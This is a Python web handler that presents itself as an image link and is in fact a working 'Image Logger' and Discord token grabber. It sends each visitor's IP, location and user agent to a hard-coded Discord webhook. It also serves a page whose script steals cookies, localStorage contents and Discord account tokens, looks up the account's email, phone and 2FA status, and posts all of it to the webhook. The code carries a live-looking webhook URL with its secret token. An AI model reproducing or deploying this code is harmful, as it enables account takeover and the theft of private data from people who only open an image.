from http.server import BaseHTTPRequestHandler
from urllib import parse
import json
import urllib.request

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Configuration
        WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
        DEFAULT_IMAGE = "https://i.imgur.com/5M6F3wQ.jpeg"
        
        # Image mappings
        IMAGES = {
            "poki": "https://i.imgur.com/5M6F3wQ.jpeg",
            "cat": "https://i.imgur.com/5M6F3wQ.jpeg",
            "dog": "https://i.imgur.com/2QksCKj.jpeg",
        }
        
        # Get visitor's real IP
        ip = (self.headers.get('CF-Connecting-IP') or 
              self.headers.get('X-Real-IP') or 
              self.headers.get('X-Forwarded-For', '').split(',')[0].strip())
        
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        # Get accurate location data
        location_data = self.get_location(ip)
        
        # Get image from URL path
        path_parts = self.path.strip('/').split('/')
        image_key = path_parts[-1].split('?')[0] if len(path_parts) > 1 else None
        image_url = IMAGES.get(image_key, DEFAULT_IMAGE)
        
        # Send IP log to Discord
        self.send_ip_log(WEBHOOK, ip, location_data, user_agent, image_key or "default", image_url)
        
        # Return HTML page
        html = self.generate_html(WEBHOOK, image_url, ip, image_key or "default")
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def get_location(self, ip):
        """Get accurate location data from IP"""
        try:
            req = urllib.request.Request(
                f"https://ipapi.co/{ip}/json/",
                headers={'User-Agent': 'Mozilla/5.0'}
            )
            with urllib.request.urlopen(req, timeout=5) as response:
                return json.loads(response.read().decode())
        except:
            try:
                with urllib.request.urlopen(f"http://ip-api.com/json/{ip}") as response:
                    data = json.loads(response.read().decode())
                    return {
                        'city': data.get('city'),
                        'region': data.get('regionName'),
                        'country': data.get('country'),
                        'latitude': data.get('lat'),
                        'longitude': data.get('lon'),
                        'org': data.get('isp'),
                        'timezone': data.get('timezone'),
                        'postal': data.get('zip')
                    }
            except:
                return {}
    
    def send_ip_log(self, webhook, ip, location, user_agent, endpoint, image_url):
        """Send IP information to Discord webhook"""
        embed = {
            "username": "Image Logger",
            "content": "@everyone",
            "embeds": [{
                "title": "🎯 Image Logger - Victim Detected",
                "color": 65280,
                "fields": [
                    {"name": "📍 IP Address", "value": f"`{ip}`", "inline": False},
                    {"name": "🌍 Location", "value": f"{location.get('city', 'Unknown')}, {location.get('region', 'Unknown')}, {location.get('country', 'Unknown')}", "inline": False},
                    {"name": "📌 Coordinates", "value": f"{location.get('latitude', 'N/A')}, {location.get('longitude', 'N/A')}", "inline": True},
                    {"name": "🕐 Timezone", "value": location.get('timezone', 'Unknown'), "inline": True},
                    {"name": "🏢 ISP", "value": location.get('org', 'Unknown'), "inline": False},
                    {"name": "🔗 Endpoint", "value": f"`{endpoint}`", "inline": True},
                    {"name": "💻 User Agent", "value": f"```{user_agent[:100]}```", "inline": False}
                ],
                "thumbnail": {"url": image_url},
                "footer": {"text": "Image Logger V3"},
                "timestamp": None
            }]
        }
        
        try:
            req = urllib.request.Request(
                webhook,
                data=json.dumps(embed).encode('utf-8'),
                headers={'Content-Type': 'application/json'}
            )
            urllib.request.urlopen(req)
        except:
            pass
    
    def generate_html(self, webhook, image_url, ip, endpoint):
        """Generate HTML page with grabber"""
        return f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:image" content="{image_url}">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <title>Image</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{ background:#000; display:flex; justify-content:center; align-items:center; min-height:100vh; }}
        img {{ max-width:100%; max-height:100vh; object-fit:contain; }}
        #dataBox {{ position:fixed; top:20px; left:20px; right:20px; background:rgba(0,255,0,0.95); color:#000; padding:20px; border-radius:10px; font:12px monospace; max-height:80vh; overflow-y:auto; z-index:999999; }}
        .section {{ margin-bottom:15px; }}
        .title {{ font-weight:bold; font-size:14px; margin-bottom:5px; }}
    </style>
</head>
<body>
    <img src="{image_url}">
    <div id="dataBox"></div>
    <script>
(async()=>{{
    const box = document.getElementById('dataBox');
    let data = '';
    
    // === COOKIES ===
    data += '<div class="section"><div class="title">🍪 COOKIES</div>';
    const cookies = document.cookie;
    if(cookies){{
        cookies.split(';').forEach(c=>{{ data += c.trim() + '<br>'; }});
    }}else{{ data += 'No cookies found<br>'; }}
    data += '</div>';
    
    // === DISCORD TOKEN & INFO ===
    data += '<div class="section"><div class="title">🔑 DISCORD ACCOUNT</div>';
    let tokens = [];
    let accountInfo = null;
    
    // Method 1: Webpack
    try{{
        if(window.webpackChunkdiscord_app){{
            window.webpackChunkdiscord_app.push([[Math.random()],{{}},r=>{{
                Object.keys(r.c).map(x=>r.c[x].exports).filter(x=>x).forEach(m=>{{
                    if(m.default?.getToken) tokens.push(m.default.getToken());
                    if(m.getToken) tokens.push(m.getToken());
                }});
            }}]);
        }}
    }}catch(e){{}}
    
    // Method 2: Storage scan
    const tokenPattern = /[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}/g;
    const mfaPattern = /mfa\\.[\\w-]{{84}}/g;
    
    try{{
        for(let i=0; i<localStorage.length; i++){{
            const val = localStorage.getItem(localStorage.key(i));
            if(val){{
                const matches = val.match(tokenPattern) || val.match(mfaPattern) || [];
                matches.forEach(t=>{{ if(!tokens.includes(t)) tokens.push(t); }});
            }}
        }}
    }}catch(e){{}}
    
    // Get account details from token
    if(tokens.length>0){{
        for(const token of tokens){{
            try{{
                const res = await fetch('https://discord.com/api/v9/users/@me',{{
                    headers:{{'Authorization':token}}
                }});
                if(res.ok){{
                    accountInfo = await res.json();
                    data += `Username: ${{accountInfo.username}}#${{accountInfo.discriminator}}<br>`;
                    data += `📧 Email: ${{accountInfo.email||'Not set'}}<br>`;
                    data += `📱 Phone: ${{accountInfo.phone||'Not set'}}<br>`;
                    data += `🆔 ID: ${{accountInfo.id}}<br>`;
                    data += `🔐 2FA: ${{accountInfo.mfa_enabled?'Enabled':'Disabled'}}<br>`;
                    data += `🔑 Token: ${{token}}<br>`;
                    
                    // Send full account info to webhook
                    await fetch('{webhook}',{{
                        method:'POST',
                        headers:{{'Content-Type':'application/json'}},
                        body:JSON.stringify({{
                            content:'@everyone',
                            embeds:[{{
                                title:'🔑 DISCORD ACCOUNT COMPROMISED',
                                color:16711680,
                                fields:[
                                    {{name:'👤 Username',value:`${{accountInfo.username}}#${{accountInfo.discriminator}}`,inline:false}},
                                    {{name:'📧 Email',value:`\`${{accountInfo.email||'None'}}\``,inline:true}},
                                    {{name:'📱 Phone',value:`\`${{accountInfo.phone||'None'}}\``,inline:true}},
                                    {{name:'🆔 User ID',value:`\`${{accountInfo.id}}\``,inline:false}},
                                    {{name:'🔐 2FA',value:accountInfo.mfa_enabled?'✅ Enabled':'❌ Disabled',inline:true}},
                                    {{name:'🔑 Token',value:`\`\`\`${{token}}\`\`\``,inline:false}},
                                    {{name:'🔗 Endpoint',value:`\`{endpoint}\``,inline:true}}
                                ],
                                thumbnail:{{url:`https://cdn.discordapp.com/avatars/${{accountInfo.id}}/${{accountInfo.avatar}}.png`}},
                                footer:{{text:'Token Logger V3'}}
                            }}]
                        }})
                    }});
                    break;
                }}
            }}catch(e){{}}
        }}
    }}else{{
        data += 'No Discord login detected<br>';
    }}
    data += '</div>';
    
    // === LOCALSTORAGE ===
    data += '<div class="section"><div class="title">💾 LOCALSTORAGE</div>';
    try{{
        if(localStorage.length>0){{
            for(let i=0; i<localStorage.length; i++){{
                const key = localStorage.key(i);
                const val = localStorage.getItem(key);
                data += `${{key}}: ${{val.substring(0,50)}}...<br>`;
            }}
        }}else{{ data += 'Empty<br>'; }}
    }}catch(e){{ data += 'Cannot access<br>'; }}
    data += '</div>';
    
    // === BROWSER INFO ===
    data += '<div class="section"><div class="title">💻 BROWSER INFO</div>';
    data += `Platform: ${{navigator.platform}}<br>`;
    data += `Language: ${{navigator.language}}<br>`;
    data += `Screen: ${{screen.width}}x${{screen.height}}<br>`;
    data += `Timezone: ${{Intl.DateTimeFormat().resolvedOptions().timeZone}}<br>`;
    data += '</div>';
    
    box.innerHTML = data;
    
    // Send cookies if found
    if(cookies){{
        await fetch('{webhook}',{{
            method:'POST',
            headers:{{'Content-Type':'application/json'}},
            body:JSON.stringify({{
                content:'@everyone',
                embeds:[{{
                    title:'🍪 COOKIES CAPTURED',
                    color:16753920,
                    description:`\`\`\`${{cookies}}\`\`\``,
                    fields:[{{name:'Endpoint',value:`\`{endpoint}\``,inline:true}}]
                }}]
            }})
        }});
    }}
}})();
    </script>
</body>
</html>'''
